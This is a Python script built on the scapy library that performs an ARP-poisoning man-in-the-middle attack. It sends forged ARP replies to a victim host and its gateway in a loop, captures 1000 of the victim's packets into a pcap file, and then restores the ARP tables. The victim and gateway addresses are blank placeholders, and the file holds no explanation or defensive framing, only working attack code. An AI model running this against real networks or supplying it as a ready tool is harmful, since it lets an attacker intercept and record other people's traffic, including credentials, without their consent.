from multiprocessing import Process
from scapy.all import ARP
from scapy.all import Ether
from scapy.all import *
import sys
import time

victim = ""
gateway=""

def MAC(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arp():
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = MAC(victim)
        self.gateway = gateway
        self.gatewaymac = MAC(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=1000):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),count=5)
        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),count=5)
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

arp = Arp(victim, gateway)
arp.run()